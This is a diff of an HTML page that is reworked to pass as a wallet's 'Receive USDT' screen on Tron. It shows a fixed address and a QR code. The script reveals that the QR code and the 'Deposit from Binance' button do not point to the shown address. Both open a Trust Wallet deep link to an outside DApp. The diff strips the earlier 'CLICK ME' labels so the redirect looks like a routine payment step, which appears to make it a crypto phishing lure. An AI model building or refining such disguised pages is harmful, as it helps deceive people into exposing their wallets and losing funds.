@@ -3,169 +3,233 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Open in Trust Wallet</title>
+  <title>Receive USDT</title>
 
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
+      -webkit-font-smoothing: antialiased;
     }
 
     body {
-      font-family: -apple-system, BlinkMacSystemFont,
-        'Segoe UI', Roboto, sans-serif;
-      background: #0a0e17;
-      color: #e5e7eb;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: #0b0e17;
+      color: #ffffff;
       min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
+      padding: 20px 16px;
     }
 
     .container {
-      max-width: 400px;
+      max-width: 340px;
       width: 100%;
-      padding: 20px;
+      display: flex;
+      flex-direction: column;
     }
 
+    /* Header Navigation */
     .header {
       display: flex;
       align-items: center;
-      gap: 12px;
-      padding: 16px 0 24px;
+      justify-content: space-between;
+      padding: 8px 0 16px;
+      position: relative;
     }
 
-    .back-btn {
+    .close-btn {
       width: 40px;
       height: 40px;
       border-radius: 50%;
-      background: #1a1f2e;
-      border: 1px solid #1f2937;
+      background: #1a202c;
       display: flex;
       align-items: center;
       justify-content: center;
       cursor: pointer;
+      border: none;
     }
 
     .header-title {
-      font-size: 18px;
+      font-size: 17px;
       font-weight: 600;
-      flex: 1;
-      text-align: center;
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+      color: #ffffff;
     }
 
-    .warning {
-      background: rgba(251,191,36,0.1);
-      border: 1px solid rgba(251,191,36,0.3);
-      border-radius: 12px;
-      padding: 12px 16px;
-      margin-bottom: 25px;
+    /* Card Wrapper */
+    .card-wrapper {
+      position: relative;
+      margin-top: 32px;
+      width: 100%;
+    }
+
+    /* Tron Badge */
+    .network-badge {
+      position: absolute;
+      top: -26px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #1c2230;
+      color: #ffffff;
+      padding: 5px 14px 5px 8px;
+      border-radius: 20px;
       display: flex;
       align-items: center;
-      gap: 10px;
+      gap: 6px;
       font-size: 13px;
-      color: #fbbf24;
+      font-weight: 500;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+      border: 1px solid #141824;
+      z-index: 10;
+      white-space: nowrap;
+    }
+
+    .badge-icon {
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      object-fit: contain;
+    }
+
+    /* Main Card Area */
+    .card-container {
+      background: #ffffff;
+      border-radius: 28px;
+      padding: 24px 14px 18px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+    }
+
+    /* QR Code Container */
+    .qr-wrapper {
+      margin-top: 8px;
+      margin-bottom: 12px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      overflow: hidden;
+    }
+
+    #qrcode {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+    }
+
+    #qrcode canvas {
+      display: block;
+      margin: 0 auto;
+    }
+
+    /* Address Formatting & Wrapping */
+    .address-text {
+      color: #000000;
+      font-size: 13.5px;
+      font-weight: 600;
+      text-align: center;
+      word-break: break-all;
+      line-height: 1.4;
+      padding: 0 16px;
+      letter-spacing: 0.1px;
+    }
+
+    /* Warning Alert */
+    .warning {
+      background: #2a1d19;
+      border-radius: 16px;
+      padding: 14px 16px;
+      margin: 20px 0 24px;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      font-size: 13px;
+      line-height: 1.4;
+      color: #ecc5a8;
     }
 
     .warning-icon {
-      width: 28px;
-      height: 28px;
+      width: 20px;
+      height: 20px;
       border-radius: 50%;
-      background: rgba(251,191,36,0.2);
+      background: #d97706;
+      color: #1a1005;
       display: flex;
       align-items: center;
       justify-content: center;
+      font-weight: 800;
+      font-size: 12px;
       flex-shrink: 0;
+      margin-top: 1px;
     }
 
-    .qr-wrapper {
+    /* Action Buttons Grid */
+    .action-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-bottom: 24px;
+    }
+
+    .action-item {
       display: flex;
-      justify-content: center;
-      margin-bottom: 25px;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
     }
 
-    .qr-box {
-      background: white;
-      border-radius: 16px;
-      padding: 16px;
-      position: relative;
+    .action-btn {
+      width: 100%;
+      height: 56px;
+      background: #1e2433;
+      border: none;
+      border-radius: 18px;
       display: flex;
       align-items: center;
       justify-content: center;
+      cursor: pointer;
+      color: #ffffff;
+      transition: background 0.15s ease;
     }
 
-    .section-label {
-      font-size: 15px;
-      font-weight: 600;
-      margin-bottom: 12px;
-      text-align: center;
+    .action-btn:active {
+      background: #2a3245;
     }
 
-    /* Main Click Me button */
-    .open-wallet-btn {
+    .action-label {
+      font-size: 14px;
+      color: #ffffff;
+      font-weight: 500;
+    }
+
+    /* Deposit Button */
+    .deposit-btn {
+      width: 100%;
+      height: 58px;
+      background: #1e2433;
+      border: none;
+      border-radius: 29px;
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 10px;
-      width: 100%;
-      padding: 17px;
-      margin-bottom: 14px;
-      border: none;
-      border-radius: 14px;
-      background: linear-gradient(135deg, #3375bb, #1b4f91);
-      color: white;
+      color: #ffffff;
       font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      box-shadow: 0 5px 20px rgba(51,117,187,0.25);
-      transition: transform 0.15s, opacity 0.15s;
-    }
-
-    .open-wallet-btn:hover {
-      opacity: 0.92;
-    }
-
-    .open-wallet-btn:active {
-      transform: scale(0.98);
-    }
-
-    .deposit-btn {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      background: #1a1f2e;
-      border: 1px solid #1f2937;
-      border-radius: 14px;
-      padding: 16px;
-      cursor: pointer;
-      width: 100%;
-      color: #e5e7eb;
-      font-size: 15px;
       font-weight: 500;
+      cursor: pointer;
+      transition: background 0.15s ease;
     }
 
-    .deposit-icon {
-      width: 36px;
-      height: 36px;
-      border-radius: 50%;
-      background: #f0b90b;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .deposit-arrow {
-      margin-left: auto;
-      color: #6b7280;
-    }
-
-    .help-text {
-      text-align: center;
-      color: #9ca3af;
-      font-size: 12px;
-      line-height: 1.5;
-      margin-top: 15px;
+    .deposit-btn:active {
+      background: #2a3245;
     }
   </style>
 </head>
@@ -173,117 +237,137 @@
 <body>
   <div class="container">
 
+    <!-- Header Navigation -->
     <div class="header">
-      <div class="back-btn" onclick="history.back()">
-        <svg width="20" height="20" viewBox="0 0 24 24"
-          fill="none" stroke="white" stroke-width="2">
-          <path d="M15 18l-6-6 6-6"/>
+      <button class="close-btn" onclick="history.back()">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round">
+          <line x1="18" y1="6" x2="6" y2="18"></line>
+          <line x1="6" y1="6" x2="18" y2="18"></line>
         </svg>
-      </div>
-      <div class="header-title">Receive BNB</div>
-      <div style="width:40px"></div>
+      </button>
+      <div class="header-title">Receive USDT</div>
     </div>
 
+    <!-- Card Wrapper -->
+    <div class="card-wrapper">
+      <div class="network-badge">
+        <img class="badge-icon" src="https://assets.streamlinehq.com/image/private/w_300,h_300,ar_1/f_auto/v1/icons/vectors/trx-q8ocxy7h0nc2c11ucr2m.png/trx-2ynri4p1kxp5a8djpqdzy8.png?_a=DATAiZAAZAA0" alt="Tron" crossorigin="anonymous" />
+        Tron
+      </div>
+
+      <div class="card-container">
+        <div class="qr-wrapper">
+          <div id="qrcode"></div>
+        </div>
+
+        <div class="address-text">
+          TLFD53gg5uraFeKMsLs8m9ZT1cpX6JFDHo
+        </div>
+      </div>
+    </div>
+
+    <!-- Warning Alert -->
     <div class="warning">
       <div class="warning-icon">!</div>
       <div>
-        Only send Trx on the Tron network to the correct
-        receiving address. Sending unsupported assets may
-        result in permanent loss.
+        Only send Tron assets to this address. Other assets will be lost forever.
       </div>
     </div>
 
-    <div class="qr-wrapper">
-      <div class="qr-box">
-        <!-- Container for the dotted QR code -->
-        <div id="qrcode"></div>
+    <!-- Actions -->
+    <div class="action-grid">
+      <div class="action-item">
+        <button class="action-btn" onclick="copyAddress()">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="9" y="9" width="13" height="13" rx="3" ry="3"></rect>
+            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+          </svg>
+        </button>
+        <span class="action-label">Copy</span>
+      </div>
+
+      <div class="action-item">
+        <button class="action-btn" onclick="shareAddress()">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"></path>
+            <polyline points="16 6 12 2 8 6"></polyline>
+            <line x1="12" y1="2" x2="12" y2="15"></line>
+          </svg>
+        </button>
+        <span class="action-label">Share</span>
       </div>
     </div>
 
-    <div class="section-label">Open in Trust Wallet</div>
-
-    <!-- Click Me button -->
-    <button
-      class="open-wallet-btn"
-      type="button"
-      onclick="openInTrustWallet()"
-    >
-      <svg width="22" height="22" viewBox="0 0 24 24"
-        fill="none" stroke="currentColor" stroke-width="2">
-        <path d="M14 3h7v7"/>
-        <path d="M10 14L21 3"/>
-        <path d="M21 14v6a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h6"/>
+    <!-- Binance Deposit Button -->
+    <button class="deposit-btn" type="button" onclick="openInTrustWallet()">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="#F0B90B">
+        <path d="M12 2L4.5 9.5L7 12L12 7L17 12L19.5 9.5L12 2ZM4.5 14.5L2 12L12 22L22 12L19.5 14.5L12 17L4.5 14.5ZM12 9.5L9.5 12L12 14.5L14.5 12L12 9.5Z"/>
       </svg>
-      CLICK ME — OPEN TRUST WALLET
+      Deposit from Binance
     </button>
-
-    <button
-      class="deposit-btn"
-      type="button"
-      onclick="openInTrustWallet()"
-    >
-      <div class="deposit-icon">
-        <svg width="20" height="20" viewBox="0 0 24 24"
-          fill="white">
-          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10
-          10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5
-          1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
-        </svg>
-      </div>
-      <span>Open </span>
-      <span class="deposit-arrow">›</span>
-    </button>
-
-    <p class="help-text">
-      Tap the button to open your DApp through Trust Wallet.
-      If Trust Wallet is not installed, install it and try again.
-    </p>
 
   </div>
 
-  <!-- Modern QR Code Styling Library -->
+  <!-- QR Code Styling Library -->
   <script src="https://cdn.jsdelivr.net/npm/qr-code-styling@1.5.0/lib/qr-code-styling.js"></script>
 
   <script>
-    // Your hosted DApp URL
+    const WALLET_ADDRESS = 'TLFD53gg5uraFeKMsLs8m9ZT1cpX6JFDHo';
     const DAPP_URL = 'https://send-usdt-trc20.vercel.app/';
+    const TRUST_WALLET_URL = 'https://link.trustwallet.com/open_url?coin_id=195&url=' + encodeURIComponent(DAPP_URL);
+    const TRON_LOGO_URL = 'https://assets.streamlinehq.com/image/private/w_300,h_300,ar_1/f_auto/v1/icons/vectors/trx-q8ocxy7h0nc2c11ucr2m.png/trx-2ynri4p1kxp5a8djpqdzy8.png?_a=DATAiZAAZAA0';
 
-    // Trust Wallet deep link
-    const TRUST_WALLET_URL =
-      'https://link.trustwallet.com/open_url?coin_id=195&url='
-      + encodeURIComponent(DAPP_URL);
-
-    // Initialize Dotted QR Code using qr-code-styling
     window.addEventListener('load', function () {
       const qrCode = new QRCodeStyling({
-        width: 200,
-        height: 200,
+        width: 250,
+        height: 250,
         type: "canvas",
-        data: TRUST_WALLET_URL,
-        image: "https://assets.streamlinehq.com/image/private/w_300,h_300,ar_1/f_auto/v1/icons/vectors/trx-q8ocxy7h0nc2c11ucr2m.png/trx-2ynri4p1kxp5a8djpqdzy8.png?_a=DATAiZAAZAA0",
+        data: TRUST_WALLET_URL, // Encodes Trust Wallet deep link so scanning opens the DApp directly
+        image: TRON_LOGO_URL,
+        margin: 0,
         dotsOptions: {
           color: "#000000",
-          type: "dots" // Changes the standard squares into round dots!
+          type: "dots"
         },
         backgroundOptions: {
-          color: "#ffffff",
+          color: "#ffffff"
         },
         imageOptions: {
           crossOrigin: "anonymous",
-          imageSize: 0.4,
-          margin: 5
+          imageSize: 0.32,
+          margin: 4
         },
         cornersSquareOptions: {
-          type: "extra-rounded" // Makes corner squares match the rounded aesthetic
+          type: "extra-rounded",
+          color: "#000000"
+        },
+        cornersDotOptions: {
+          type: "dot",
+          color: "#000000"
         }
       });
 
       qrCode.append(document.getElementById("qrcode"));
     });
 
-    // Open DApp through Trust Wallet
     function openInTrustWallet() {
       window.location.href = TRUST_WALLET_URL;
+    }
+
+    function copyAddress() {
+      navigator.clipboard.writeText(WALLET_ADDRESS);
+      alert('Address copied!');
+    }
+
+    function shareAddress() {
+      if (navigator.share) {
+        navigator.share({
+          title: 'TRX Address',
+          text: WALLET_ADDRESS
+        });
+      } else {
+        copyAddress();
+      }
     }
   </script>
 </body>
